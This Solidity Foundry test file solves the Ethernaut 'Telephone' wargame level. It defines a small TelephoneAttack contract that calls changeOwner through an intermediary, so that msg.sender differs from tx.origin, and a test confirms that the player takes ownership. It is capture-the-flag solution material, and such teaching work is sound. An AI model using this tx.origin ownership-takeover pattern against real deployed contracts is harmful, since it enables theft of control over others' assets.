// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {Utils} from "test/utils/Utils.sol";

import {Telephone} from "src/levels/Telephone.sol";
import {TelephoneFactory} from "src/levels/TelephoneFactory.sol";
import {Level} from "src/levels/base/Level.sol";
import {Ethernaut} from "src/Ethernaut.sol";

// create an attack contract to make msg.sender != tx.origin
contract TelephoneAttack {
    Telephone public telephone;

    constructor(address _telephoneContract)  {
        telephone = Telephone(_telephoneContract);
    }   
    function attack(address _newOwner) external payable {
        telephone.changeOwner(_newOwner);
    }
}

contract TestTelephoneSolution is Test, Utils {
    Ethernaut ethernaut;
    Telephone instance;
    TelephoneAttack telephoneAttack;

    address payable owner;
    address payable player;

    /*//////////////////////////////////////////////////////////////
                                 HELPERS
    //////////////////////////////////////////////////////////////*/

    function setUp() public {
        address payable[] memory users = createUsers(2);

        owner = users[0];
        vm.label(owner, "Owner");

        player = users[1];
        vm.label(player, "Player");

        vm.startPrank(owner);
        ethernaut = getEthernautWithStatsProxy(owner);
        TelephoneFactory factory = new TelephoneFactory();
        ethernaut.registerLevel(Level(address(factory)));
        vm.stopPrank();

        vm.startPrank(player);
        instance = Telephone(payable(createLevelInstance(ethernaut, Level(address(factory)), 0.001 ether)));
        
        // deploy attack contract
        telephoneAttack = new TelephoneAttack(address(instance));
        vm.stopPrank();
    }

    

    /*//////////////////////////////////////////////////////////////
                                 TESTS
    //////////////////////////////////////////////////////////////*/

    /// @notice Check the intial state of the level and enviroment.
    function testInit() public {
        vm.startPrank(player);
        assertFalse(submitLevelInstance(ethernaut, address(instance)));
    }

    function testSolve() public payable {
        // To solve this issue, it's intended to call changeOwner() function from a contract
        // to make msg.sender != tx.origin however this can be achieved in foundry by just calling from a test,
        // since the tx origin will be always a different contract from tests
        vm.startPrank(player);
        // call the contract to set player as the new owner
        telephoneAttack.attack(player);
        // assert that owner is the player
        assertEq(instance.owner(), player);
    }
}